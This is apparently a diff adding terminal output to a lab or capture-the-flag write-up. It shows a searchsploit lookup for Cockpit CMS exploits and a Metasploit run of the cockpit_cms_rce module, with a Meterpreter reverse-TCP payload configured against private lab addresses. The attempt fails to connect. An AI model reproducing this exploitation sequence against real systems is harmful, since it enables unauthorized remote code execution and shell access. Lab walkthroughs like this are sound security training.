@@ -124,3 +124,128 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 122.54 seconds
 ```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Cockpit     
+---------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL In | multiple/webapps/50185.py
+Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery               | php/webapps/44567.txt
+Cockpit CMS 0.6.1 - Remote Code Execution                             | php/webapps/49390.txt
+Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)   | multiple/webapps/49397.txt
+openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                    | php/webapps/47305.py
+---------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+```
+                                                                                                        
+┌──(root㉿kali)-[/home/kali]
+└─# msfconsole
+Metasploit tip: Store discovered credentials for later use with creds
+                                                  
+                                              `:oDFo:`                            
+                                           ./ymM0dayMmy/.                          
+                                        -+dHJ5aGFyZGVyIQ==+-                    
+                                    `:sm⏣~~Destroy.No.Data~~s:`                
+                                 -+h2~~Maintain.No.Persistence~~h+-              
+                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
+                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
+                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
+                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
+                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
+                      :we're.all.alike'`                     The.PFYroy.No.D7:  
+                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
+                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
+                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
+                      :<script>.Ac816/                        sENbove3101.404:    
+                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
+                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
+                      :#OUTHOUSE-  -s:                       /corykennedyData:    
+                      :$nmap -oS                              SSo.6178306Ence:    
+                      :Awsm.da:                            /shMTl#beats3o.No.:    
+                      :Ring0:                             `dDestRoyREXKC3ta/M:    
+                      :23d:                               sSETEC.ASTRONOMYist:    
+                       /-                        /yo-    .ence.N:(){ :|: & };:    
+                                                 `:Shall.We.Play.A.Game?tron/    
+                                                 ```-ooy.if1ghtf0r+ehUser5`    
+                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                                                                                                                                   
+                                              `MjM~~WE.ARE.se~~MMjMs                                                                                                                                                                        
+                                               +~KANSAS.CITY's~-`                                                                                                                                                                           
+                                                J~HAKCERS~./.`                                                                                                                                                                              
+                                                .esc:wq!:`                                                                                                                                                                                  
+                                                 +++ATH`                                                                                                                                                                                    
+                                                  `                                                                                                                                                                                         
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+       =[ metasploit v6.4.98-dev                                ]                                                                                                                                                                           
++ -- --=[ 2,571 exploits - 1,316 auxiliary - 1,680 payloads     ]                                                                                                                                                                           
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]                                                                                                                                                                           
+                                                                                                                                                                                                                                            
+Metasploit Documentation: https://docs.metasploit.com/                                                                                                                                                                                      
+The Metasploit Framework is a Rapid7 Open Source Project                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+msf > search cockpit
+                                                                                                                                                                                                                                            
+Matching Modules                                                                                                                                                                                                                            
+================                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+   #  Name                                Disclosure Date  Rank    Check  Description                                                                                                                                                       
+   -  ----                                ---------------  ----    -----  -----------
+   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce
+
+msf > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(multi/http/cockpit_cms_rce) > options
+
+Module options (exploit/multi/http/cockpit_cms_rce):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   ENUM_USERS  true             no        Enumerate users
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sapni
+   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT       80               yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /                yes       The URI of Cockpit
+   USER                         no        User account to take over
+   VHOST                        no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.233.56.40     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/http/cockpit_cms_rce) > set RHOSTS 10.233.56.95
+RHOSTS => 10.233.56.95
+msf exploit(multi/http/cockpit_cms_rce) > set RPORT 9090
+RPORT => 9090
+msf exploit(multi/http/cockpit_cms_rce) > exploit
+[*] Started reverse TCP handler on 10.233.56.40:4444 
+[*] Attempting Username Enumeration (CVE-2020-35846)
+[-] Exploit aborted due to failure: unexpected-reply: 10.233.56.95:9090 - Could not connect to the web service
+[*] Exploit completed, but no session was created.
+
+
+```
